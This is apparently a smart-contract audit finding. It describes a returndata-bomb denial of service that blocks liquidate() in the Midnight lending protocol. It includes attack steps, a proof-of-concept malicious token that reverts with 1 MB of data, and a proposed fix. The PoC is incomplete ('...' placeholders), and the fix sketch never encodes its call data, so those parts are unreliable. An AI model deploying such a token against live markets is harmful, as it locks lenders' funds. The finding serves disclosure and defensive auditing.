### Title
Returndata Bomb in `SafeTransferLib.safeTransfer` Enables Permanent OOG DoS of `liquidate()` - (File: src/libraries/SafeTransferLib.sol)

### Summary

`SafeTransferLib.safeTransfer` copies the full returndata from a failed `transfer()` call into a `bytes memory` variable, paying quadratic memory-expansion gas. Because market creation is permissionless and no check validates the collateral token's behavior, an attacker can deploy a malicious collateral token whose `transfer()` reverts with a multi-megabyte payload, making every call to `liquidate()` for that market OOG-revert regardless of how much gas the liquidator provides.

### Finding Description

**Exact code path:**

`Midnight.liquidate()` at [1](#0-0)  calls `SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets)` unconditionally — even when `seizedAssets == 0` (the bad-debt-only case where both inputs are zero).

Inside `safeTransfer`: [2](#0-1) 

```solidity
(bool success, bytes memory returndata) = token.call(...);
if (!success) {
    assembly ("memory-safe") {
        revert(add(returndata, 0x20), mload(returndata))
    }
}
```

The `bytes memory returndata` allocation uses `RETURNDATACOPY` to copy the entire returndata into the caller's memory. The EVM charges quadratic memory-expansion gas for this copy: `cost = 3·words + words²/512`. For a 1 MB payload (~32 768 words) this is ≈ 2.2 M gas; for a 2 MB payload it exceeds 8 M gas; for ~4 MB it exceeds the 30 M block gas limit entirely, making the call permanently unexecutable.

**Attacker-controlled inputs and preconditions:**

`touchMarket()` is fully permissionless. The only checks on a collateral token are address ordering, an allowed LLTV tier, and a valid `maxLif` value — no behavioral validation of the token contract itself: [3](#0-2) 

An attacker therefore:
1. Deploys `MaliciousToken` — `transferFrom()` succeeds (so collateral can be supplied), `transfer()` always reverts with a ≥ 1 MB payload.
2. Deploys `MaliciousOracle` — initially returns a healthy price, later returns a price that makes the position unhealthy.
3. Calls `touchMarket()` with `MaliciousToken` as collateral and `MaliciousOracle` as the oracle.
4. Supplies `MaliciousToken` as collateral and borrows (attacker can be both maker and taker in the permissionless market).
5. Switches `MaliciousOracle` to return a low price → position becomes unhealthy.
6. Every subsequent call to `liquidate()` hits `safeTransfer` → `MaliciousToken.transfer()` reverts with the bomb → `bytes memory returndata` expansion OOGs the caller.

**Why existing checks do not stop it:**

- `token.code.length > 0` only verifies the token has bytecode, not that `transfer()` behaves correctly. [4](#0-3) 
- All state mutations (debt reduction, collateral seizure, `lossFactor` update) happen before the `safeTransfer` call, so they are rolled back on OOG revert, leaving the position permanently unhealthy and unliquidatable. [5](#0-4) 
- There is no gas-capped call, no returndata size cap, and no try/catch around the transfer.

### Impact Explanation

Any liquidator calling `liquidate()` on the poisoned market OOGs before the function can complete. The unhealthy position — including any bad debt — can never be resolved. Lenders in the market cannot recover funds through liquidation, and the `lossFactor` update that socializes bad debt is permanently blocked. The DoS is permanent and costs the attacker only the gas to set up the market and position.

### Likelihood Explanation

Market creation is permissionless and requires no governance approval. The attacker needs only to deploy two cheap contracts (malicious token + oracle), create a market, and open a small borrow position. The attack is repeatable across any number of markets. The only cost is the initial setup gas. Any third-party liquidation bot or user attempting to liquidate the position will be griefed.

### Recommendation

Cap the amount of returndata copied in `safeTransfer` and `safeTransferFrom`. Replace the high-level `bytes memory returndata` allocation with a low-level assembly block that reads at most a fixed number of bytes (e.g., 256 bytes) before deciding whether to revert or continue:

```solidity
function safeTransfer(address token, address to, uint256 value) internal {
    require(token.code.length > 0, NoCode());
    bool success;
    bytes memory returndata;
    assembly ("memory-safe") {
        let ptr := mload(0x40)
        success := call(gas(), token, 0, ptr, 0x44, 0, 0)
        // encode call data inline or use abi.encodeCall before assembly
        let rdsize := returndatasize()
        // cap copied returndata to 256 bytes
        let copySize := rdsize
        if gt(copySize, 256) { copySize := 256 }
        returndata := mload(0x40)
        mstore(returndata, copySize)
        returndatacopy(add(returndata, 0x20), 0, copySize)
        mstore(0x40, add(add(returndata, 0x20), copySize))
    }
    if (!success) {
        assembly ("memory-safe") {
            revert(add(returndata, 0x20), mload(returndata))
        }
    }
    require(returndata.length == 0 || abi.decode(returndata, (bool)), TransferReturnedFalse());
}
```

Alternatively, use `returndatasize()` to gate the copy: if `returndatasize() > MAX_RETURNDATA_SIZE`, revert with a fixed local error instead of propagating the bomb.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market, CollateralParams} from "src/Midnight.sol";

contract BombToken {
    // transferFrom succeeds so collateral can be supplied
    function transferFrom(address, address, uint256) external returns (bool) { return true; }
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
    // transfer reverts with 1 MB of data
    function transfer(address, uint256) external pure {
        bytes memory bomb = new bytes(1_048_576); // 1 MB
        assembly { revert(add(bomb, 0x20), mload(bomb)) }
    }
    function approve(address, uint256) external returns (bool) { return true; }
}

contract BombOracle {
    uint256 public p = 1e36;
    function price() external view returns (uint256) { return p; }
    function setPrice(uint256 _p) external { p = _p; }
}

contract ReturndataBombTest is Test {
    Midnight midnight; // deployed in setUp

    function testOOGLiquidate() public {
        BombToken token = new BombToken();
        BombOracle oracle = new BombOracle();

        // Create market with malicious token + oracle
        CollateralParams[] memory cp = new CollateralParams[](1);
        cp[0] = CollateralParams({
            token: address(token),
            lltv: 0.77e18,
            maxLif: /* valid maxLif for 0.77 lltv */ ...,
            oracle: address(oracle)
        });
        Market memory market = Market({loanToken: ..., maturity: block.timestamp + 1 days,
                                       collateralParams: cp, rcfThreshold: 0, liquidatorGate: address(0)});
        midnight.touchMarket(market);

        // Supply collateral and borrow (attacker is both sides)
        midnight.supplyCollateral(market, 0, 1e18, address(this));
        // ... set up borrow position ...

        // Drop oracle price to make position unhealthy
        oracle.setPrice(1); // effectively zero collateral value

        // Attempt liquidation with a generous but finite gas limit
        // Expected: OOG revert due to 1 MB returndata memory expansion (~2.2M gas)
        (bool ok,) = address(midnight).call{gas: 500_000}(
            abi.encodeCall(midnight.liquidate, (market, 0, 0, 0, address(this), false, address(this), address(0), ""))
        );
        assertFalse(ok, "liquidate must OOG");

        // Assert position is still unhealthy and debt unchanged (state rolled back)
        assertGt(midnight.debtOf(toId(market), address(this)), 0, "debt not cleared");
    }
}
```

**Expected assertions:** `liquidate` reverts (OOG) for any caller providing less than the memory-expansion cost of the bomb payload; the borrower's debt and collateral remain unchanged in storage; the market's `lossFactor` is not updated; bad debt is permanently unresolvable.

### Citations

**File:** src/Midnight.sol (L670-696)
```text
            uint128 newCollateral = _position.collateral[collateralIndex] - UtilsLib.toUint128(seizedAssets);
            _position.collateral[collateralIndex] = newCollateral;
            if (newCollateral == 0 && seizedAssets > 0) {
                _position.collateralBitmap = _position.collateralBitmap.clearBit(collateralIndex);
            }
            _marketState.withdrawable += UtilsLib.toUint128(repaidUnits);
            _position.debt -= UtilsLib.toUint128(repaidUnits);
        }

        address payer = callback != address(0) ? callback : msg.sender;

        emit EventsLib.Liquidate(
            msg.sender,
            id,
            market.collateralParams[collateralIndex].token,
            seizedAssets,
            repaidUnits,
            borrower,
            postMaturityMode,
            receiver,
            payer,
            badDebt,
            _marketState.lossFactor,
            _marketState.continuousFeeCredit
        );

        SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets);
```

**File:** src/Midnight.sol (L762-773)
```text
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }
```

**File:** src/libraries/SafeTransferLib.sol (L13-13)
```text
        require(token.code.length > 0, NoCode());
```

**File:** src/libraries/SafeTransferLib.sol (L15-19)
```text
        (bool success, bytes memory returndata) = token.call(abi.encodeCall(IERC20.transfer, (to, value)));
        if (!success) {
            assembly ("memory-safe") {
                revert(add(returndata, 0x20), mload(returndata))
            }
```
